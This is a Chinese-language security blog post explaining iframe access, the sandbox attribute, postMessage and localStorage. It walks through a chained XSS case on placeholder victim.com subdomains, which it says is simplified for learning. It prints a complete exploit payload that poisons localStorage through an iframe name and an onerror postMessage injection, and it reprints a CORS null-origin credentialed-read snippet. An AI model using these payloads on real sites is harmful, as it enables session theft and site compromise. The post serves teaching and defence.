---
title: 跨窗口通信 & localstorage => XSS
date: February 25th 2020
tags: [Web安全, XSS, postMessage, LocalStorage]
summary: 分析跨窗口通信（postMessage）与 LocalStorage 结合产生 XSS 漏洞的完整案例，总结 postMessage 安全使用规范。
---

# 跨窗口通信 & localstorage => XSS

学长在之前分享过一个集跨窗口通信与localstorage一身的XSS漏洞，一直拖着没有整理。想来想去还是躲不掉的，今晚就此整理一下吧。先总结一下跨窗口通信与localstorage的笔记，最后再把这个XSS漏洞的过程梳理一遍。

## iframe实现嵌套窗口

iframe标签可以在窗口内嵌套一个窗口，嵌入的窗口有它单独的 `document` 和 `window` 对象。当html中存在一个`<iframe>`标签时，有两种方式可以获取到它们：

- iframe.contentWindow 是对 <iframe> 里 window 的引用。
- iframe.contentDocument 是对 <iframe> 里的 document 对象的引用。

除了直接上方的两种方式，还可以使用`window.frames`来获取`<iframe>`的窗口对象。

- 通过索引获取：window.frames[0] —— 当前文档里第一个 iframe 的窗口。
- 通过名称获取：window.frames.iframeName —— 获取 name="iframeName" 的 iframe 窗口。

**对iframe窗口的操作**

如果是一个非同源窗口，我们可以对获取得到的对象进行以下的操作：

- 通过 iframe.contentWindow 获取内部窗口的 window
- 修改它的 location

```html
<iframe src="https://example.com" id="iframe"></iframe>
<script>
    iframe.onload = function() {
        // 获取内部窗口的引用
        let iframeWindow = iframe.contentWindow;
        // 修改地址
		iframe.contentWindow.location = '/';    
    }
</script>
```

如果是一个同源的窗口，可以对它的document对象进行任何的操作。

```html
<iframe src="/index.html" id="iframe"></iframe>
<script>
  iframe.onload = function() {
    // 随便做任何事
    iframe.contentDocument.body.prepend("Hello, world!");
  };
</script>
```

**iframe标签的sandbox属性**

`sandbox` 属性允许在 `<iframe>` 中禁止某些特定操作，以避免执行一些不被信任的代码。它通过将它当做非同源的网页对待以及添加一些限制以实现 iframe 的沙盒化。

sanbox有以下一写限制属性：

- allow-top-navigation 允许 iframe 修改父窗口的地址。
- allow-forms 允许在 iframe 内提交表单。
- allow-scripts 允许在 iframe 内运行脚本。
- allow-popups 允许来自 iframe 的 window.open 弹出窗口。

之前记录的CORS的null值绕过时，就使用了iframe的box属性：

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>var req=new XMLHttpRequest();req.onload=reqListener;req.open("get","http://127.0.0.1/test.html",true);req.withCredentials=true;req.send();function reqListener(){alert(this.responseText)};</script>'></iframe>
```

## postMessage实现跨窗口通信

直接来看一个例子：

iframe.html

```html
<script>
	window.addEventListener('message', function(event) {
		alert(`Received ${event.data} from ${event.origin}`);
	});
</script>
```

index.html

```html
<iframe src="iframe.html" id="iframe" style="display:block;height:60px"></iframe>
<script>
    iframe.onload = function() {
      iframe.contentWindow.postMessage("Hello I'm Threezh1", '*');
      return false;
    };
</script>
```

当打开`index.html`，就会弹出`Received Hello I'm Threezh1 from http://localhost`的窗口。这个过程就是`index.html`给`iframe.html`发送信息的过程。

postMessage有两个参数：

- data 要发送的数据
- targetOrigin 指定目标窗口的源，如http://example.com就是指定窗口中的源必须是example.com。如果不限制源，则填写为*

接受信息使用`addEventListener`添加一个`message`事件。事件中的`event`对象有以下属性：

- event.data 从postMessage传递来的数据
- event.origin 发送方的源
- event.source 对发送方窗口的引用。如果我们需要的话可以立即回复 postMessage

**寻找postMessage导致的xss漏洞：**从js中寻找类似于`message`接收器，往此页面发送：`window.postMessage("hello", "*") `判断其能否形成XSS。

这类XSS的防御：

```js
function receiveMessage(event) {
 // 来源信任
 if (event.origin !== "http://example.com:8080")
 return;
 // event.source作为回信的对象，并且把event.origin作为targetOrigin，避免泄露敏感信息。
 event.source.postMessage("secret message", event.origin); }
window.addEventListener("message", receiveMessage, false);
```

## localstorage实现本地储存

HTML5 提供了两种新的本地存储方案，sessionStorage和localStorage，统称WebStorage。

sessionStorage 是针对session的数据存储，页面被关闭时，存储的数据会被清除。  
localStorage 存储的数据可以长期保留

localstorage的几种操作：

```js
// 增加数据
localStorage.setItem('myCat', 'Tom');

// 读取数据
let cat = localStorage.getItem('myCat');

// 移除数据
localStorage.removeItem('myCat');

// 移除所有数据
localStorage.clear();
```

## iframe + postMessage + localstorage = XSS

案例环境：

A页面：[http://a.victim.com/myhonor.html](http://a.victim.com/myhonor.html) 这个页面存在两个问题：

- 降域：页面将当前源通过JS设置成了父域document.domain="victim.com"
- 存在从localstorage中取数据的操作，并且会将取出的值回显到页面上形成XSS

B页面：[http://b.victim.com/ueditor.html](http://b.victim.com/ueditor.html) 这个页面存在一个message监听事件，并将postMessage传递来的数据回显到页面上，形成XSS漏洞

目的： 从B页面到A页面的XSS漏洞

从A页面的第二个问题中我们可以想到，我们可以通过污染localstorage的值来达到A页面中XSS的目的。最后构造出来的payload如下：

```html
<iframe src="https://a.victim.com/index.html" name="proxy"></iframe>
<script>
function loadxss() {
	var frame = document.createElement("iframe");
	frame.src = "https://b.victim.com/ueditor.html";
	frame.name = "document.domain='victim.com';ccc=function(){top.proxy.localStorage.setItem('app_friends_{test}','alert(999)')};setInterval('ccc ()');";
	frame.onload = function() {
		window[1].postMessage('{"sendEditorValue":"<img src=x onerror=eval(parent.name)>"}', "*");
	}
	document.body.appendChile(frame);
}
</script>
```

那执行的步骤又是怎么样的呢？

1. 通过iframe加载A页面
2. 通过js，创建一个iframe加载B页面
3. 将加载B页面的iframe命名为一个设置A页面localstorage的js
4. 给B页面发送postMessage请求
5. B页面接受请求导致xss并执行B页面的iframe名称中的payload
6. 导致A页面的xss

*PS：这里的环境不是真实的环境，很多细节都已抹去。仅是为了学习其中的思路。此外，这里不直接通过B页面的XSS污染localstorage是为了绕过waf。*

通过这个例子给了一点新的思考……

## 参考

- 跨窗口通信
- 基于localStorage的本地存储XSS
- Window.localStorage